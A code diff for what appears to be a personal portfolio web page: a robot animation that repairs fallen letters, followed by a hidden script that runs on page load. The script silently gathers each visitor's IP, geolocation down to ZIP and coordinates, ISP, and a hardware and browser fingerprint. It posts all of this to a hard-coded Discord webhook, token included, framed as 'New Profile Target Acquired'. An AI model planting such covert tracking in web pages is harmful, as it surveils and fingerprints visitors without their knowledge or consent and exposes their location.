+                        l.rot *= 0.9; 
+                        l.el.style.transform = `translate3d(${l.x}px, ${l.y}px, 0) rotate(${l.rot}deg)`;
+                    }
+                });
+
+                if (bot.state === 'patrol') {
+                    const fallen = lettersData.filter(l => l.state === 'floor');
+                    if (fallen.length > 0) {
+                        bot.targetLetter = fallen[0];
+                        bot.state = 'fetching';
+                    } else {
+                        bot.patrolAngle += 0.02;
+                        bot.targetX = (sceneContainer.offsetWidth / 2) + Math.cos(bot.patrolAngle) * 150 - 20;
+                        bot.targetY = 40 + Math.sin(bot.patrolAngle * 0.5) * 20;
+                        tractorBeam.style.opacity = '0';
+                    }
+                } 
+                else if (bot.state === 'fetching') {
+                    if (!bot.targetLetter) { bot.state = 'patrol'; return; }
+                    bot.targetX = bot.targetLetter.origSceneX + bot.targetLetter.x - 20; bot.targetY = bot.targetLetter.origSceneY + bot.targetLetter.y - 45;
+                    const dx = bot.targetX - bot.x; const dy = bot.targetY - bot.y; const dist = Math.sqrt(dx*dx + dy*dy);
+                    if (dist < 15) { 
+                        bot.targetLetter.state = 'carried'; bot.targetLetter.el.classList.remove('falling'); bot.targetLetter.el.classList.add('carried'); bot.state = 'returning'; tractorBeam.style.opacity = '1'; tractorBeam.style.height = '15px';
+                    }
+                }
+                else if (bot.state === 'returning') {
+                    bot.targetX = bot.targetLetter.origSceneX - 20; bot.targetY = bot.targetLetter.origSceneY - 45;
+                    const dx = bot.targetX - bot.x; const dy = bot.targetY - bot.y; const dist = Math.sqrt(dx*dx + dy*dy);
+                    if (dist < 10) { bot.state = 'welding'; bot.weldTimer = 30; }
+                }
+                else if (bot.state === 'welding') {
+                    bot.weldTimer--;
+                    emitWeldSparks(bot.targetLetter.origSceneX, bot.targetLetter.origSceneY);
+                    bot.targetLetter.x = (Math.random() - 0.5) * 4; bot.targetLetter.y = (Math.random() - 0.5) * 4; bot.targetLetter.el.style.transform = `translate3d(${bot.targetLetter.x}px, ${bot.targetLetter.y}px, 0)`;
+                    if (bot.weldTimer <= 0) {
+                        bot.targetLetter.state = 'normal'; bot.targetLetter.x = 0; bot.targetLetter.y = 0; bot.targetLetter.rot = 0;
+                        bot.targetLetter.el.style.transform = `translate3d(0,0,0) rotate(0deg)`; bot.targetLetter.el.classList.remove('carried');
+                        bot.targetLetter = null; bot.state = 'patrol'; tractorBeam.style.opacity = '0';
+                        lastDropTime = timestamp;
+                    }
+                }
+
+                const speed = bot.state === 'fetching' ? 0.08 : (bot.state === 'returning' ? 0.05 : 0.03);
+                bot.x += (bot.targetX - bot.x) * speed; bot.y += (bot.targetY - bot.y) * speed;
+                const vx = (bot.targetX - bot.x) * speed; const botTilt = Math.max(-15, Math.min(15, vx * 2));
+                botEl.style.transform = `translate3d(${bot.x}px, ${bot.y}px, 0) rotate(${botTilt}deg)`;
+
+                requestAnimationFrame(gameLoop);
+            }
+
+            setTimeout(() => { requestAnimationFrame(gameLoop); }, 1000);
+
+            /* ==========================================================================
+               MAXIMUM TELEMETRY VISITOR NOTIFICATION SYSTEM (DISCORD)
+               ========================================================================== */
+            async function notifyVisitor() {
+                const WEBHOOK_URL = "https://discord.com/api/webhooks/1496963306236149932/O1LFMjFvuOz52UdLfirUCU2oR2_ECaXpQaGIDp-4hQiwISfG99Icg6-i-QzJ75NhRWaD";
+                
+                try {
+                    // 1. Core Browser & Screen Data
+                    const w = window.screen.width;
+                    const h = window.screen.height;
+                    const vW = window.innerWidth;
+                    const vH = window.innerHeight;
+                    const cores = navigator.hardwareConcurrency || "Unknown";
+                    const ram = navigator.deviceMemory || "Unknown";
+                    const isTouch = navigator.maxTouchPoints > 0 ? "Yes" : "No";
+                    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
+                    const lang = navigator.language || "Unknown";
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+                    const colorDepth = window.screen.colorDepth || "Unknown";
+
+                    // 2. Advanced Network Data
+                    let connType = "Unknown", connSpeed = "Unknown Mbps", connPing = "Unknown ms";
+                    if (navigator.connection) {
+                        connType = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
+                        connSpeed = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Unknown Mbps";
+                        connPing = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Unknown ms";
+                    }
+
+                    // 3. GPU Extraction (WebGL Fingerprint)
+                    let gpu = "Hidden/Unknown";
+                    try {
+                        const glCanvas = document.createElement('canvas');
+                        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                        if (gl) {
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (debugInfo) { gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
+                        }
+                    } catch (e) { }
+
+                    // 4. Battery Extraction Fix
+                    let batteryStat = "Hidden by Browser";
+                    try {
+                        if ('getBattery' in navigator) {
+                            const batt = await navigator.getBattery();
+                            if (batt && typeof batt.level === 'number') {
+                                batteryStat = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Plugged In ⚡' : 'Unplugged 🔋'})`;
+                            }
+                        }
+                    } catch (e) { }
+
+                    // 5. BULLETPROOF IP & GEOLOCATION (Unmetered & Unblockable Fallbacks)
+                    let ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown";
+                    let isp = "Unknown", asn = "Unknown", zip = "Unknown", latLong = "Unknown";
+                    
+                    try {
+                        // API 1: GeoJS (Highly reliable, no strict rate limits, rarely blocked)
+                        const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
+                        if (!res.ok) throw new Error("GeoJS Failed");
+                        const geoData = await res.json();
+                        ip = geoData.ip || ip; city = geoData.city || city; region = geoData.region || region;
+                        country = geoData.country || country; isp = geoData.organization || geoData.organization_name || isp; 
+                        asn = geoData.asn || asn; latLong = (geoData.latitude && geoData.longitude) ? `${geoData.latitude}, ${geoData.longitude}` : latLong;
+                    } catch (e1) {
+                        try {
+                            // API 2: FreeIPAPI (Great secondary fallback)
+                            const res2 = await fetch("https://freeipapi.com/api/json");
+                            if (!res2.ok) throw new Error("FreeIPAPI Failed");
+                            const geoData2 = await res2.json();
+                            ip = geoData2.ipAddress || ip; city = geoData2.cityName || city; region = geoData2.regionName || region;
+                            country = geoData2.countryName || country; zip = geoData2.zipCode || zip; 
+                            latLong = (geoData2.latitude && geoData2.longitude) ? `${geoData2.latitude}, ${geoData2.longitude}` : latLong;
+                        } catch (e2) {
+                            try {
+                                // API 3: The "Unblockable" Cloudflare Trace (If adblockers kill everything else, this gets the IP)
+                                const res3 = await fetch("https://1.1.1.1/cdn-cgi/trace");
+                                const text = await res3.text();
+                                const lines = text.split('\n');
+                                lines.forEach(line => {
+                                    if(line.startsWith('ip=')) ip = line.split('=')[1];
+                                    if(line.startsWith('loc=')) country = line.split('=')[1];
+                                });
+                                isp = "Cloudflare Trace (Adblocker active)";
+                            } catch (e3) {
+                                ip = "Strictly Blocked by Browser";
+                            }
+                        }
+                    }
+
+                    // 6. Build the Ultimate Discord Embed
+                    const payload = {
+                        username: "SYSTEM INTRUSION DETECTED",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/2165/2165578.png",
+                        content: "<@&YOUR_ROLE_ID> 🚨 **New Profile Target Acquired** 🚨", 
+                        embeds: [{
+                            title: "🔍 Deep Telemetry Report",
+                            color: 16711680, 
+                            fields: [
+                                { name: "📍 Geolocation", value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}\n**ZIP:** ${zip}\n**Lat/Long:** \`${latLong}\``, inline: true },
+                                { name: "🌐 Network Routing", value: `**IP Address:** \`${ip}\`\n**ISP:** ${isp}\n**ASN:** \`${asn}\`\n**Connection:** ${connType} | ${connSpeed} | ${connPing}`, inline: true },
+                                { name: "💻 Hardware Fingerprint", value: `**CPU Cores:** ${cores}\n**Approx RAM:** ${ram} GB\n**GPU / Renderer:** \`${gpu}\`\n**Battery:** ${batteryStat}`, inline: false },
+                                { name: "🖥️ Display Metrics", value: `**Screen:** ${w}x${h} (${colorDepth}-bit)\n**Viewport:** ${vW}x${vH}\n**Touch:** ${isTouch}\n**Theme:** ${darkMode}`, inline: true },
+                                { name: "🌍 Context & Locale", value: `**Language:** ${lang}\n**Timezone:** ${timezone}\n**Local Time:** ${new Date().toLocaleTimeString()}\n**Referrer:** ${document.referrer || "Direct"}`, inline: true },
+                                { name: "🤖 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                            ],
+                            footer: { text: "Osaid Shahid Security System | Maximum Telemetry Engaged" },
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (error) {
+                    console.log("Telemetry scan aborted.");
+                }
+            }
+
+            if (!sessionStorage.getItem("portfolio_visited")) {
+                notifyVisitor();
+                sessionStorage.setItem("portfolio_visited", "true");
+            }
+        });
+    </script>
+</body>
+</html>
